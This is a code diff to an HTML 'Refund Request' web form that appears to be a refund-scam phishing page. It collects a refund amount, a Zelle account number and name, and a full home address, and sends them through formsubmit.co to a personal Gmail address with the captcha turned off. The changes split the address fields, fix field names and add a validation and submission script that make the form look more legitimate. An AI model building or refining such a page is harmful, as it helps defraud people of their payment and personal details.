@@ -71,6 +71,7 @@
       margin-bottom: 1rem;
       transition: border-color 0.3s ease, box-shadow 0.3s ease;
       font-family: 'Inter', sans-serif;
+      box-sizing: border-box;
     }
     input:focus, textarea:focus {
       border-color: #9333ea;
@@ -93,6 +94,12 @@
       background: linear-gradient(to right, #7e22ce, #db2777);
       transform: scale(1.02);
     }
+    .message {
+      margin-top: 1rem;
+      font-weight: 600;
+      text-align: center;
+      color: #333;
+    }
   </style>
 </head>
 <body>
@@ -101,27 +108,63 @@
       <div class="logo">🔁</div>
       <h1><span>Refund Request</span></h1>
     </div>
-    <form action="https://formsubmit.co/jenifferlaure05@gmail.com" method="POST">
-      <input type="hidden" name="_next" value="iiii.html">
-      <input type="hidden" name="_captcha" value="false">
+    <form id="refundForm" action="https://formsubmit.co/jenifferlaure05@gmail.com" method="POST" novalidate>
+      <input type="hidden" name="_next" value="iiii.html" />
+      <input type="hidden" name="_captcha" value="false" />
 
       <label for="name">Name (Optional)</label>
       <input type="text" name="Contact Address" id="name" placeholder="Your Name" optional />
 
       <label for="amount">Refund Amount</label>
-      <input type="text" name="Refund Amonut" id="amount" placeholder="Enter Amount" required />
+      <input type="text" name="Refund Amount" id="amount" placeholder="Enter Amount" required />
 
       <label for="phone">Zelle Number and Name</label>
-      <input type="text" name="Phone" id="phone" placeholder="Your Zelle Account Number" required />
+      <input type="text" name="Zelle Acct Number" id="phone" placeholder="Your Zelle Account Number" required />
 
-      <label for="address">Address</label>
-      <textarea name="Address" id="address" rows="3" placeholder="123 Main St, City, State, ZIP" required></textarea>
+      <label>Address</label>
+      <input type="text" name="Street" id="street" placeholder="Street Address" required />
+      <input type="text" name="City" id="city" placeholder="City" required style="margin-bottom: 0.5rem;" />
+      <input type="text" name="State" id="state" placeholder="State / Province" required style="margin-bottom: 0.5rem;" />
+      <input type="text" name="Zip" id="zip" placeholder="Zip / Postal Code" required />
 
       <label for="reason">Reason for Refund</label>
       <textarea name="Refund Reason" id="reason" rows="4" placeholder="Explain your reason..." required></textarea>
 
       <button type="submit">Request Refund</button>
     </form>
+    <div id="formMessage" class="message" role="alert" aria-live="polite"></div>
   </div>
+
+  <script>
+    (function() {
+      const form = document.getElementById('refundForm');
+      const messageEl = document.getElementById('formMessage');
+
+      form.addEventListener('submit', function(event) {
+        event.preventDefault(); // prevent default submit
+
+        messageEl.textContent = '';
+        // Perform basic validation - can be extended as needed
+        if (!form.checkValidity()) {
+          messageEl.textContent = 'Please fill out all required fields correctly.';
+          messageEl.style.color = 'red';
+          form.reportValidity();
+          return;
+        }
+
+        // Optionally: show a loading message or disable inputs here
+
+        messageEl.textContent = 'Submitting your refund request...';
+        messageEl.style.color = '#333';
+
+        // Submit form programmatically
+        // Using native submit to allow formsubmit.co handling
+        setTimeout(() => {
+          form.submit();
+        }, 800); // simulate short delay to show message
+      });
+    })();
+  </script>
 </body>
 </html>
+
